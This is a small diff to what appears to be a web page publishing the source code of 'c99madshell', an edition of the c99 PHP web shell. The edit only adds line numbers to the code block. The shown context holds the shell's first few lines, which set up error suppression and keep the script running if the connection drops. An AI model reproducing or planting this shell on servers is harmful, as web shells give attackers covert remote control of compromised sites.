@@ -17,7 +17,7 @@ This is the &#8216;2.0 madnet edition&#8217; of the [original c99 shell][1]
 
 ### c99madshell Source Code
 
-{% highlight php %}<?php
+{% highlight php linenos %}<?php
 if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
 error_reporting(5);
 @ignore_user_abort(TRUE);
